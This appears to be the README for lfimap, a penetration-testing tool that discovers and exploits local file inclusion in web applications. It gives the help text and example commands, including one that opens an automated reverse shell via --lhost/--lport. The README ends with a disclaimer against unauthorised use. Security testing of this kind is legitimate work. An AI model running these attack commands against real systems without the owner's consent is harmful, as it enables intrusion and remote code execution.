# lfimap
## Local file inclusion discovery and exploitation tool

### Main features
- data:// for remote code execution
- expect:// for remote code execution
- input:// for remote code execution
- filter:// for arbitrary file inclusion
- file:// for arbitrary file inclusion
- Remote file inclusion for code execution
- Reflected XSS testing
- Absolute and relative path truncation for file inclusion
- Option to test POST arguments
- Option to specify custom http headers
- Option to specify cookies for authenticated requests
- Option to specify a web proxy to send requests through
- Option for automated reverse shell attack upon RCE detection

### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)
- [Usage](https://github.com/hansmach1ne/lfimap/wiki)

### -h, --help
```

usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <request>] [-H <header>] [-P <proxy>] [--useragent <agent>] 
                 [--referer <referer>] [--param <name>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file] [--xss] 
                 [--info] [-a] [-x] [--lhost <lhost>] [--lport <lport>] [-wT <path>] [-wX <path>] [-wC <path>] [-v] [-h]

lfimap, Local File Inclusion discovery and exploitation tool

MANDATORY:
  -U [url]                       Specify url, Ex: "http://example.org/vuln.php?param=PWN" 
  -F [urlfile]                   Specify url wordlist (every line should have --param|'PWN'.)

GENERAL OPTIONS:
  -C <cookie>                    Specify session cookie, Ex: "PHPSESSID=1943785348b45"
  -D <request>                   Do HTTP POST value test. Ex: "param=PWN"
  -H <header>                    Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
  -P <proxy>                     Specify Proxy IP address. Ex: "http://127.0.0.1:8080"
  --useragent <agent>            Specify HTTP user agent
  --referer <referer>            Specify HTTP referer
  --param <name>                 Specify different test parameter value
  --no-stop                      Don't stop using same method upon findings

ATTACK TECHNIQUE:
  -f, --filter                   Attack using filter:// wrapper
  -i, --input                    Attack using input:// wrapper
  -d, --data                     Attack using data:// wrapper
  -e, --expect                   Attack using expect:// wrapper
  -t, --trunc                    Attack using path truncation with wordlist (default "short.txt")
  -r, --rfi                      Attack using remote file inclusion
  -c, --cmd                      Attack using command injection
  --file                         Attack using file:// wrapper
  --xss                          Test for reflected XSS
  --info                         Test for basic information disclosures
  -a, --all                      Use all available methods to attack

PAYLOAD OPTIONS:
  -x, --exploit                  Exploit to reverse shell if possible (Setup reverse listener first)
  --lhost <lhost>                Specify local ip address for reverse connection
  --lport <lport>                Specify local port number for reverse connection

WORDLIST OPTIONS:
  -wT <path>                     Specify wordlist for truncation test
  -wX <path>                     Specify wordlist for xss test
  -wC <path>                     Specify wordlist for command injection test

OTHER:
  -v, --verbose                  Print more detailed output when performing attacks
  -h, --help                     Print this help message                   

```
### Examples 

#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a`  

![all_attacks](https://user-images.githubusercontent.com/57464251/169725893-d1c898a2-86ef-497a-936d-dbbe5bc154a4.png)


#### 2) Reverse shell command execution attack with '-x'.
`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  

![rev_shell](https://user-images.githubusercontent.com/57464251/169725946-7565eb46-c896-40c6-8bfc-8e24c840419d.png)

#### 3) Post argument testing with '-D'. 
`python3 lfimap.py http://IP/index.php -D "param=PWN" -a`

![postreq_test](https://user-images.githubusercontent.com/57464251/169726000-89d4e66a-8ddc-4598-941a-710dc8f4db51.png)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
Pull requests are welcome.

[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.
